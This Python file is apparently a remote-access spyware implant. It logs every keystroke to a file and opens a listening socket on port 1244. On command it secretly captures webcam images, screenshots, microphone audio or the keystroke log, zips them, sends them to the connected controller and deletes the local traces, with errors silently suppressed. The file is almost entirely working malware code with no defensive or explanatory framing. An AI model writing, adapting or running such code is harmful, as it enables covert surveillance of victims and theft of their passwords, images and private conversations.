import time, socket, sys, os, cv2, signal, pyautogui
from zipfile import *
import sounddevice as sd
from scipy.io.wavfile import write
from pexecute.thread import ThreadLoom
from pynput.keyboard import Key, Listener
import logging
import winsound
def on_press(key):
        logging.info(str(key))
def fun3():
    log_dir = ""
    logging.basicConfig(filename=(log_dir + "log"), level=logging.DEBUG, format='%(message)s')
    with Listener(on_press=on_press) as listener:
        listener.join()
def fun2():
        while 1:
                try:
                        print('Setup Server...')
                        time.sleep(1)
                        soc = socket.socket()
                        host_name = socket.gethostname()
                        ip = socket.gethostbyname(host_name)
                        port = 1244
                        soc.bind((host_name, port))
                        print(host_name, '({})'.format(ip))
                        f = open("ipfile", "w")
                        f.write(ip)
                        f.close()
                        soc.listen(1) 
                        conn, addr = soc.accept()
                        while 1:
                                raw_data = conn.recv(1024)
                                data = repr(raw_data)[2:-1]
                                print(data)
                                if (data == 'webcam'):
                                        webcam = cv2.VideoCapture(0)
                                        check, frame = webcam.read()
                                        raw_data = conn.recv(1024)
                                        key = repr(raw_data)[2:-1]
                                        if key == 's':
                                                cv2.imwrite(filename='a.jpg', img=frame)
                                                webcam.release()
                                                img_new = cv2.imread('a.jpg', cv2.IMREAD_GRAYSCALE)
                                                cv2.waitKey(1650)
                                                cv2.destroyAllWindows()
                                                img_ = cv2.imread('a.jpg', cv2.IMREAD_ANYCOLOR)
                                                gray = cv2.cvtColor(img_, cv2.COLOR_BGR2GRAY)
                                                img_ = cv2.resize(gray,(28,28))
                                                img_resized = cv2.imwrite(filename='a-final.jpg', img=img_)
                                                with ZipFile('send.zip', 'w') as myzip:
                                                        myzip.write('a.jpg')
                                                with open ('send.zip','rb') as f1:
                                                        conn.send(f1.read(9000000))
                                                os.remove('send.zip')
                                                os.remove('a.jpg')
                                                os.remove('a-final.jpg')
                                if (data == 'screenshot'):
                                        im2 = pyautogui.screenshot('ss.png')
                                        with ZipFile('send.zip', 'w') as myzip:
                                                myzip.write('ss.png')
                                        with open ('send.zip','rb') as f1:
                                                conn.send(f1.read(9000000))
                                        os.remove('send.zip')
                                        os.remove('ss.png')
                                if (data == 'keylog'):
                                        with ZipFile('send.zip', 'w') as myzip:
                                                myzip.write('log')
                                        with open ('send.zip','rb') as f1:
                                                conn.send(f1.read(9000000))
                                        os.remove('send.zip')
                                if (data == 'audio'):
                                        fs = 44100
                                        raw_data = conn.recv(1024)
                                        seconds = repr(raw_data)[2:-1]
                                        seconds = int(seconds)
                                        raw_data = conn.recv(1024)
                                        conf = repr(raw_data)[2:-1]
                                        if(conf=='s'):
                                                myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
                                                sd.wait()  
                                                write('file.mp3', fs, myrecording)  
                                        with ZipFile('send.zip', 'w') as myzip:
                                                myzip.write('file.mp3')
                                        with open ('send.zip','rb') as f1:
                                                conn.send(f1.read(9000000))
                                        os.remove('send.zip')
                                        os.remove('file.mp3')
                        conn.close()
                except:
                        pass
loom = ThreadLoom(max_runner_cap=10)
loom.add_function(fun2, [], {})
loom.add_function(fun3, [], {})

output = loom.execute()
